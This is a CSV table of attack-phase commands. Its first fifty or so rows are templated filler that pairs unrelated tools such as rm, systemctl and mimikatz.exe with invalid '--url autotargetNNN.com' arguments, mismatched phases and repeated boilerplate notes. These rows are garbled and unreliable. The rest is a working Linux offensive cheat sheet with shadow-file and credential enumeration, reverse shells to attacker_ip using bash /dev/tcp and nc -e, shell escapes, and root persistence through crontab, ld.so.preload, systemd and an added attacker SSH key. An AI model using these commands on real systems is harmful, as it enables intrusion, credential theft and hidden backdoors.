target_type,subtype,phase,tool,command,notes
Network,SNMP,Reconnaissance,upload-shell,upload-shell --url http://autotarget249.com,"This vector uses upload-shell during the reconnaissance phase against a SNMP application. It targets http://autotarget249.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Scanning,systemctl,systemctl --url http://autotarget250.com,"This vector uses systemctl during the scanning phase against a Node.js application. It targets http://autotarget250.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Enumeration,sudo-l,sudo-l --url http://autotarget251.com,"This vector uses sudo-l during the enumeration phase against a General application. It targets http://autotarget251.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Scanning,mimikatz.exe,mimikatz.exe --url http://autotarget252.com,"This vector uses mimikatz.exe during the scanning phase against a Magento application. It targets http://autotarget252.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Post Exploitation,systemd,systemd --url http://autotarget253.com,"This vector uses systemd during the post exploitation phase against a Node.js application. It targets http://autotarget253.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Persistence,cewl,cewl --url http://autotarget254.com,"This vector uses cewl during the persistence phase against a Joomla application. It targets http://autotarget254.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Exploitation,upload-shell,upload-shell --url http://autotarget255.com,"This vector uses upload-shell during the exploitation phase against a General application. It targets http://autotarget255.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Reconnaissance,pass-the-hash,pass-the-hash --url http://autotarget256.com,"This vector uses pass-the-hash during the reconnaissance phase against a Laravel application. It targets http://autotarget256.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Enumeration,config-leak,config-leak --url http://autotarget257.com,"This vector uses config-leak during the enumeration phase against a RDP application. It targets http://autotarget257.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Reconnaissance,curl,curl --url http://autotarget258.com,"This vector uses curl during the reconnaissance phase against a SMB application. It targets http://autotarget258.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Post Exploitation,wp-cli,wp-cli --url http://autotarget259.com,"This vector uses wp-cli during the post exploitation phase against a Drupal application. It targets http://autotarget259.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Cleanup,laravel-expose,laravel-expose --url http://autotarget260.com,"This vector uses laravel-expose during the cleanup phase against a SMB application. It targets http://autotarget260.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Reconnaissance,wpscan,wpscan --url http://autotarget261.com,"This vector uses wpscan during the reconnaissance phase against a General application. It targets http://autotarget261.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Post Exploitation,browser-exploit,browser-exploit --url http://autotarget262.com,"This vector uses browser-exploit during the post exploitation phase against a Laravel application. It targets http://autotarget262.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Enumeration,ssh-keyscan,ssh-keyscan --url http://autotarget263.com,"This vector uses ssh-keyscan during the enumeration phase against a Laravel application. It targets http://autotarget263.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Persistence,rm,rm --url http://autotarget264.com,"This vector uses rm during the persistence phase against a FTP application. It targets http://autotarget264.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Exploitation,cewl,cewl --url http://autotarget265.com,"This vector uses cewl during the exploitation phase against a Magento application. It targets http://autotarget265.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Enumeration,nikto,nikto --url http://autotarget266.com,"This vector uses nikto during the enumeration phase against a Magento application. It targets http://autotarget266.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Persistence,freerdp,freerdp --url http://autotarget267.com,"This vector uses freerdp during the persistence phase against a Drupal application. It targets http://autotarget267.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Persistence,sublist3r,sublist3r --url http://autotarget268.com,"This vector uses sublist3r during the persistence phase against a Node.js application. It targets http://autotarget268.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Enumeration,find,find --url http://autotarget269.com,"This vector uses find during the enumeration phase against a Joomla application. It targets http://autotarget269.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Enumeration,webshell,webshell --url http://autotarget270.com,"This vector uses webshell during the enumeration phase against a General application. It targets http://autotarget270.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Reconnaissance,crackmapexec,crackmapexec --url http://autotarget271.com,"This vector uses crackmapexec during the reconnaissance phase against a PHP application. It targets http://autotarget271.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Cleanup,atq,atq --url http://autotarget272.com,"This vector uses atq during the cleanup phase against a PHP application. It targets http://autotarget272.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Exploitation,cewl,cewl --url http://autotarget273.com,"This vector uses cewl during the exploitation phase against a Node.js application. It targets http://autotarget273.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Reconnaissance,wpscan,wpscan --url http://autotarget274.com,"This vector uses wpscan during the reconnaissance phase against a Magento application. It targets http://autotarget274.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Privilege Escalation,hydra,hydra --url http://autotarget275.com,"This vector uses hydra during the privilege escalation phase against a Joomla application. It targets http://autotarget275.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Scanning,upload-shell,upload-shell --url http://autotarget276.com,"This vector uses upload-shell during the scanning phase against a FTP application. It targets http://autotarget276.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Post Exploitation,at,at --url http://autotarget277.com,"This vector uses at during the post exploitation phase against a SNMP application. It targets http://autotarget277.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Persistence,dnsrecon,dnsrecon --url http://autotarget278.com,"This vector uses dnsrecon during the persistence phase against a PHP application. It targets http://autotarget278.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Enumeration,systemd,systemd --url http://autotarget279.com,"This vector uses systemd during the enumeration phase against a FTP application. It targets http://autotarget279.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Scanning,systemd,systemd --url http://autotarget280.com,"This vector uses systemd during the scanning phase against a Node.js application. It targets http://autotarget280.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Exploitation,wp-cli,wp-cli --url http://autotarget281.com,"This vector uses wp-cli during the exploitation phase against a General application. It targets http://autotarget281.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Scanning,bash-reverse,bash-reverse --url http://autotarget282.com,"This vector uses bash-reverse during the scanning phase against a Joomla application. It targets http://autotarget282.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Exploitation,php-reverse-shell,php-reverse-shell --url http://autotarget283.com,"This vector uses php-reverse-shell during the exploitation phase against a Laravel application. It targets http://autotarget283.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Post Exploitation,onesixtyone,onesixtyone --url http://autotarget284.com,"This vector uses onesixtyone during the post exploitation phase against a General application. It targets http://autotarget284.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Scanning,burpsuite,burpsuite --url http://autotarget285.com,"This vector uses burpsuite during the scanning phase against a WordPress application. It targets http://autotarget285.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Cleanup,onesixtyone,onesixtyone --url http://autotarget286.com,"This vector uses onesixtyone during the cleanup phase against a Drupal application. It targets http://autotarget286.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Enumeration,rm,rm --url http://autotarget287.com,"This vector uses rm during the enumeration phase against a ASP.NET application. It targets http://autotarget287.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Post Exploitation,wpscan,wpscan --url http://autotarget288.com,"This vector uses wpscan during the post exploitation phase against a FTP application. It targets http://autotarget288.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Post Exploitation,freerdp,freerdp --url http://autotarget289.com,"This vector uses freerdp during the post exploitation phase against a Joomla application. It targets http://autotarget289.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Cleanup,xss,xss --url http://autotarget290.com,"This vector uses xss during the cleanup phase against a SMB application. It targets http://autotarget290.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Scanning,sudo-l,sudo-l --url http://autotarget291.com,"This vector uses sudo-l during the scanning phase against a WordPress application. It targets http://autotarget291.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Cleanup,whatweb,whatweb --url http://autotarget292.com,"This vector uses whatweb during the cleanup phase against a SMB application. It targets http://autotarget292.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Privilege Escalation,config-tampering,config-tampering --url http://autotarget293.com,"This vector uses config-tampering during the privilege escalation phase against a FTP application. It targets http://autotarget293.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Privilege Escalation,env-vars,env-vars --url http://autotarget294.com,"This vector uses env-vars during the privilege escalation phase against a ASP.NET application. It targets http://autotarget294.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Enumeration,snmpwalk,snmpwalk --url http://autotarget295.com,"This vector uses snmpwalk during the enumeration phase against a Drupal application. It targets http://autotarget295.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Enumeration,hydra,hydra --url http://autotarget296.com,"This vector uses hydra during the enumeration phase against a Laravel application. It targets http://autotarget296.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Cleanup,webshell,webshell --url http://autotarget297.com,"This vector uses webshell during the cleanup phase against a ASP.NET application. It targets http://autotarget297.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Cleanup,sublist3r,sublist3r --url http://autotarget298.com,"This vector uses sublist3r during the cleanup phase against a Joomla application. It targets http://autotarget298.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Scanning,config-tampering,config-tampering --url http://autotarget299.com,"This vector uses config-tampering during the scanning phase against a Laravel application. It targets http://autotarget299.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
System,Linux,Enumeration,uname,uname -a,"Displays detailed kernel version, architecture, and OS information. Useful for fingerprinting the system and identifying potential kernel vulnerabilities relevant to the specific kernel release and architecture."
System,Linux,Enumeration,lsb_release,lsb_release -a,"Provides complete distribution information including distribution name, release number, and codename. Useful for targeting exploits or compatibility checks for software deployment."
System,Linux,Enumeration,cat,cat /etc/passwd,"Lists all user accounts configured on the system. Often used for enumeration to find interesting or privileged accounts and to check for users with shell access."
System,Linux,Enumeration,cat,cat /etc/shadow,"Displays hashed passwords for local user accounts (root only). Accessing this file may allow offline password cracking and assessment of password strength."
System,Linux,Enumeration,ps,ps aux,"Shows all currently running processes on the system, including their owners and command line arguments. Can reveal sensitive information, credentials, or malicious processes."
System,Linux,Enumeration,netstat,netstat -tuln,"Lists all open network ports and associated services. Helpful for identifying exposed services and their listening state for lateral movement or exploitation."
System,Linux,Enumeration,ss,ss -tulwn,"Provides detailed information about active sockets and connections, which can reveal running services, backdoors, or tunnels established by malware."
System,Linux,Enumeration,find,find / -perm -4000 -type f 2>/dev/null,"Searches the filesystem for SUID binaries, which are often abused for privilege escalation. A critical step for local enumeration."
System,Linux,Enumeration,id,id,"Prints the current user's UID, GID, and group memberships. Essential for understanding the current security context and privilege boundaries."
System,Linux,Enumeration,wget,wget --spider http://google.com,"Performs a non-intrusive check for outbound HTTP connectivity from the host, which is useful for verifying egress firewall rules and internet access."
System,Linux,Enumeration,curl,curl ifconfig.me,"Fetches the external public IP address of the host, which can help determine whether the machine is behind NAT or directly exposed."
System,Linux,Enumeration,hostname,hostname,"Returns the hostname of the system. Useful for network mapping, pivoting, or identifying the target within a larger environment."
System,Linux,Enumeration,df,df -h,"Displays disk space usage for all mounted filesystems in human-readable format. Can reveal hidden or full partitions."
System,Linux,Enumeration,free,free -m,"Shows memory usage statistics, which can be useful for detecting resource exhaustion, memory-hogging malware, or simply for reconnaissance."
System,Linux,Enumeration,ls,ls -la /root,"Lists files in the root user's home directory, revealing sensitive files, scripts, or backups if permissions are misconfigured."
System,Linux,Enumeration,arp,arp -a,"Prints the ARP cache table to show other devices recently communicated with on the local network, useful for network mapping."
System,Linux,Enumeration,route,route -n,"Shows the kernel's IP routing table, which helps identify network segmentation, default gateways, and potential routes for lateral movement."
System,Linux,Enumeration,env,env,"Prints all current environment variables. These may contain credentials, secrets, or configuration details used by applications."
System,Linux,Enumeration,last,last -10,"Displays the last 10 successful logins, providing valuable intelligence about legitimate users and recent activity."
System,Linux,Enumeration,lastlog,lastlog,"Shows the last login time for all users, helping to identify dormant, suspicious, or newly created accounts."
System,Linux,Enumeration,cat,cat /etc/group,"Lists all groups and their members, which is important for understanding access control and identifying privilege escalation paths."
System,Linux,Enumeration,dpkg,dpkg -l,"Displays a full list of installed packages on Debian/Ubuntu systems. Useful for detecting vulnerable software versions or installed security tools."
System,Linux,Enumeration,rpm,rpm -qa,"Shows all installed RPM packages on RedHat/CentOS systems, helping to map installed software and possible vulnerabilities."
System,Linux,Enumeration,crontab,crontab -l,"Displays the current user's scheduled cron jobs. These can be used for persistence, exfiltration, or attack automation."
System,Linux,Enumeration,lsmod,lsmod,"Lists all currently loaded kernel modules, which can indicate the presence of kernel rootkits or custom drivers."
System,Linux,Enumeration,uname,uname -mrs,"Quickly prints the kernel name, version, and hardware architecture for precise fingerprinting."
System,Linux,Enumeration,history,history,"Shows shell command history for the current user. Reveals previous admin actions, credentials, and potentially sensitive commands."
System,Linux,Enumeration,cat,cat /etc/hosts,"Prints the system's hosts file, which can reveal local overrides, custom C2 entries, or internal hostnames."
System,Linux,Enumeration,cat,cat /etc/resolv.conf,"Displays DNS resolver configuration. Useful for identifying internal DNS servers or evidence of DNS hijacking."
System,Linux,Enumeration,uptime,uptime,"Shows how long the system has been running since last reboot. May indicate system stability or timing of suspicious activity."
System,Linux,Enumeration,who,who,"Displays all users currently logged into the system, which helps detect unauthorized access or lateral movement."
System,Linux,Enumeration,users,users,"Prints all currently logged in users, providing additional session context."
System,Linux,Enumeration,sudo,sudo -l,"Lists permitted sudo commands for the current user, which is a common vector for privilege escalation if misconfigured."
System,Linux,Enumeration,dmesg,dmesg | tail -20,"Displays recent kernel messages, which can reveal hardware issues, driver loading, or evidence of exploits."
System,Linux,Enumeration,iptables,iptables -L,"Shows current firewall rules applied to the host, useful for planning attacks or detecting restrictions."
System,Linux,Enumeration,su,su -,"Attempts to switch to another user (if credentials are known), often used for privilege escalation."
System,Linux,Enumeration,sudo,sudo su -,"Tries to spawn a root shell using sudo, directly testing for misconfigured privilege boundaries."
System,Linux,Enumeration,curl,curl -I http://target,"Performs a HEAD request to an HTTP target, useful for checking connectivity and HTTP header info."
System,Linux,Enumeration,scp,scp file user@host:/tmp,"Securely copies files to a remote system. Used for transferring payloads or stolen data."
System,Linux,Enumeration,ssh-keygen,ssh-keygen -lf ~/.ssh/authorized_keys,"Displays information about authorized SSH keys, which can identify attackers or old access keys."
System,Linux,Exploitation,bash,bash -i >& /dev/tcp/attacker_ip/4444 0>&1,"Establishes a bash-based reverse shell to a remote host, enabling remote control over the compromised system."
System,Linux,Exploitation,nc,nc -e /bin/sh attacker_ip 4444,"Uses netcat to create a reverse shell, granting remote access. Classic technique for post-exploitation."
System,Linux,Exploitation,python,python -c 'import pty; pty.spawn(\"/bin/bash\")',"Spawns a pseudo-terminal shell using Python for improved interactive capabilities and stability during exploitation."
System,Linux,Exploitation,perl,perl -e 'exec \"/bin/sh\";',"Executes a shell via Perl, which can be leveraged when other shells are restricted or unavailable."
System,Linux,Exploitation,msfvenom,msfvenom -p linux/x86/shell_reverse_tcp ...,"Generates a customizable shell payload for Linux, compatible with Metasploit's multi/handler listener."
System,Linux,Exploitation,awk,awk 'BEGIN {s = \"/bin/sh -i\"}; { system(s) }',"Uses awk to break out to a shell, a common escape method from restricted environments."
System,Linux,Exploitation,tar,tar cf /dev/null . --checkpoint=1 --checkpoint-action=exec=/bin/sh,"Abuses the --checkpoint-action option of tar to execute a shell, useful for privilege escalation if tar is run as root."
System,Linux,Persistence,crontab,echo \"* * * * * root /tmp/payload\" >> /etc/crontab,"Adds a cron job that executes a malicious payload every minute as root, ensuring persistent access."
System,Linux,Persistence,rc.local,echo \"/tmp/payload\" >> /etc/rc.local,"Appends a payload to rc.local for execution on every boot, granting persistent root access."
System,Linux,Persistence,systemd,cp payload.service /etc/systemd/system/; systemctl enable payload,"Installs and enables a malicious systemd service for reliable and stealthy persistence."
System,Linux,Persistence,init,echo \"/tmp/payload\" >> /etc/init.d/rc.local,"Ensures payload execution via legacy init scripts, common on older systems."
System,Linux,Persistence,ssh,echo \"ssh-rsa AAAA... user@attacker\" >> ~/.ssh/authorized_keys,"Adds attacker's public key for persistent SSH access without password authentication."
System,Linux,Persistence,ld.so.preload,echo \"/tmp/malicious.so\" > /etc/ld.so.preload,"Loads a malicious shared object on every program start, commonly used for rootkits and deep persistence."
System,Linux,Persistence,rc.d,cp payload /etc/rc.d/,"Copies the payload into rc.d for persistence across reboots in BSD-style systems."
System,Linux,Persistence,profile,echo \"/tmp/payload\" >> /etc/profile,"Appends the payload to the global shell profile so that it executes each time a shell is started."
System,Linux,PrivEsc,sudo,sudo -l,"Enumerates all commands the user can run as root via sudo, which is a fundamental step in privilege escalation workflows."
